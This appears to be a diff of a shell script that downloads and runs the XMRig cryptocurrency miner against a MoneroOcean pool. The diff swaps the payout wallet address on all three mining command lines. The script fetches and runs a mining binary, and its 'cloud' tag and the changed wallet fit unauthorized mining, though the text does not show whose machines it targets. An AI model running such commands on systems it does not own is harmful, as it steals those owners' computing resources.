@@ -1,8 +1,8 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz
 tar -xf xmrig-6.15.2-linux-x64.tar.gz
 cd xmrig-6.15.2
-./xmrig --threads=4 -a rx/0 -o gulf.moneroocean.stream:10128 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqoJAjjRR6vSLviBVE -p cloud
+./xmrig --threads=4 -a rx/0 -o gulf.moneroocean.stream:10128 -u 4BBUMhG1HPxKrimFS3qwt7jJJ3q6NfkJeCPNZzBrgtYoNGf7NkeLGUKJecuneus9Sy8Vc5Gzu6STqguBcJA3uhFCQBF6kDa -p cloud
 
-./xmrig --threads=4 -a panthera -o gulf.moneroocean.stream:10128 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqoJAjjRR6vSLviBVE -p cloud
+./xmrig --threads=4 -a panthera -o gulf.moneroocean.stream:10128 -u 4BBUMhG1HPxKrimFS3qwt7jJJ3q6NfkJeCPNZzBrgtYoNGf7NkeLGUKJecuneus9Sy8Vc5Gzu6STqguBcJA3uhFCQBF6kDa -p cloud
 
-./xmrig --threads=4 -a cn/gpu -o gulf.moneroocean.stream:10128 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqoJAjjRR6vSLviBVE -p cloud
+./xmrig --threads=4 -a cn/gpu -o gulf.moneroocean.stream:10128 -u 4BBUMhG1HPxKrimFS3qwt7jJJ3q6NfkJeCPNZzBrgtYoNGf7NkeLGUKJecuneus9Sy8Vc5Gzu6STqguBcJA3uhFCQBF6kDa -p cloud
